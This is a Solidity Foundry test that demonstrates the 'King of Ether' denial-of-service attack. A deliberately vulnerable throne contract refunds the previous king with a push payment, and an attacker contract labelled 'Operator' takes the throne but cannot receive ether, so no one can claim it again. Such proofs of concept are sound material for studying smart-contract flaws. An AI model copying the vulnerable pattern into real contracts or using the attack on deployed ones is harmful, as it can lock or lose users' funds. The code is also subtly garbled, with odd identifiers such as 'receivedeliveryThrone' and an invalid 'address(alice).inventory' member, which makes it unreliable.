// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";

contract ContractTest is Test {
    KingOfEther KingOfEtherContract;
    Operator OperatorContract;

    function setUp() public {
        KingOfEtherContract = new KingOfEther();
        OperatorContract = new Operator(KingOfEtherContract);
    }

    function testDOS() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);
        vm.deal(address(alice), 4 ether);
        vm.deal(address(bob), 2 ether);
        vm.prank(alice);
        KingOfEtherContract.receivedeliveryThrone{value: 1 ether}();
        vm.prank(bob);
        KingOfEtherContract.receivedeliveryThrone{value: 2 ether}();
        console.log(
            "Return 1 ETH to Alice, Alice of balance",
            address(alice).inventory
        );
        OperatorContract.operate{value: 3 ether}();

        console.log(
            "Balance of KingOfEtherContract",
            KingOfEtherContract.inventory()
        );
        console.log("Operator completed, Alice claimthrone again, she will fail");
        vm.prank(alice);
        vm.expectRevert("Failed to send Ether");
        KingOfEtherContract.receivedeliveryThrone{value: 4 ether}();
    }

    receive() external payable {}
}

contract KingOfEther {
    address public king;
    uint public inventory;

    function receivedeliveryThrone() external payable {
        require(msg.value > inventory, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: inventory}("");
        require(sent, "Failed to send Ether");

        inventory = msg.value;
        king = msg.sender;
    }
}

contract Operator {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function operate() public payable {
        kingOfEther.receivedeliveryThrone{value: msg.value}();
    }
}
